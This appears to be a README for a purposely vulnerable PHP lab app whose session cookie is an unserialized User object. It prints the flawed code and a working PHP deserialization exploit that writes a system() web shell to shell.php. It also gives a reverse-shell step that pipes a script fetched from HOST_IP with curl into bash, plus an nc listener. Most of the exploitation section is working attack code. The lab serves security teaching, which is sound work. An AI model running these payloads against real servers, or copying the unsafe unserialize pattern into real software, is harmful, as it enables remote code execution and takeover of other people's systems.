# phpserialization-poc
This is a vulnerable php Application that serialize user class object for session management.

## How work The app
The /notes endpoint is protected and users with author privileges can it to retrieve thier notes. When user login the application
serialize the user class object and send it as cookie to the client (browser) for session management. The user class has a deconstructor
that logs users requests. 

## Run the App
#### Use the image
```sh
docker pull lig10/phpdeserialization-poc:v1.0 
docker run -d -p 3000:80 lig10/phpdeserialization-poc:v1.0
```

#### Build the image
```sh
git clone https://github.com/gil01karougbe/phpserialization-poc.git
cd phpserialization-poc
docker build -t phpserialization-poc .
docker run -d -p 3000:80 phpserialization-poc
```

## Access the App
![image](https://github.com/user-attachments/assets/f80111ff-9ca6-4eb0-a610-80c9b0e6768f)

Use the Following creds to login:
```sh
admin:admin
user:iloveyou!
john:soccer
```
![image](https://github.com/user-attachments/assets/0c2c4a9a-c534-411a-b0a9-f00b84eb38bd)
![image](https://github.com/user-attachments/assets/c5f6b3ed-af49-4ae2-bbb1-9a23cc9caee5)

## Exploitation
### Code Analysis
```php
<?php
class User{
    public $name = "";
    public $level = "";
    public $filename = "logs.txt";
    public $message = "Request From ";
    
    public function __destruct(){
        $currentDate = date('Y-m-d H:i:s');
        file_put_contents(__DIR__ . "/" . $this->filename, $this->message . $this->name . " " . $currentDate . ".\n", FILE_APPEND);
    }
}
if (isset($_COOKIE['user_token'])) {
    $token = $_COOKIE['user_token'];
    $decoded = base64_decode($token);
    $usr = unserialize($decoded);
    // SOME CODE HERE(use of the user object to search for his notes!!!)
} else {
    echo "Token not found. User not authenticated.";
}

?>
```
### Exploit
```php
<?php
class User{
    public $name = "admin";
    public $level = "";
    public $filename = "shell.php";
    public $message = "<?php system(\$_GET['cmd']); ?>";
}
//admin 
$admin = new User();
echo serialize($admin);
echo "\n";
$Token1 = base64_encode(serialize($admin));
echo $Token1;
?>
```
![image](https://github.com/user-attachments/assets/ec8d7ef2-e56c-4817-96ef-7af04dd796ca)

### RCE
![image](https://github.com/user-attachments/assets/d5f3da57-d7ef-48c9-a400-07569486eca3)
![image](https://github.com/user-attachments/assets/2c1a1832-8114-46f7-86d2-68ac15c34673)

## One Way to get a Reverse Shell
```sh
shell.php?cmd=curl http://HOST_IP/revshell.sh | bash
nc -lvnp 12345
```
![image](https://github.com/user-attachments/assets/c95d8edb-408d-45ff-972a-bf06e840974f)

![image](https://github.com/user-attachments/assets/94a11fb0-86ba-4bbc-8de3-91f8751291b1)






